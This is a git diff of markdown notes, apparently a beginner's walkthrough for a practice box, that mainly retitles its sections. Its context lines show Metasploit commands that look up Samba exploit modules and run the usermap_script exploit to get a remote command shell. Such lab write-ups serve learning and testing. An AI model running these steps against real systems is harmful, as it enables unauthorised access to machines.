@@ -1,11 +1,11 @@
-# H1 First Box
+#H1 First Box
 
-# H2 Terminal setup
+#H2 Terminal setup
 
 Either be in root or use sudo. 
 Create three tabs (VPN, NMAP, HACK).
 
-# H2 Step One
+# H2 Enumeration
 
 First scans
 
@@ -26,6 +26,7 @@ Review the excellent ranked modules
 msf5> info /exploit/linux/samba
 msf5> info /exploit/multi/samba/usermap_script
 ```
+#H2 Attack
 
 To execute
 ```
@@ -36,6 +37,8 @@ msf5 exploit(multi/samba/usermap_script) >  exploit
 ```
 
 This will create a command shell back in the terminal
+
+#H2 Endgame
 
 summary
 ```
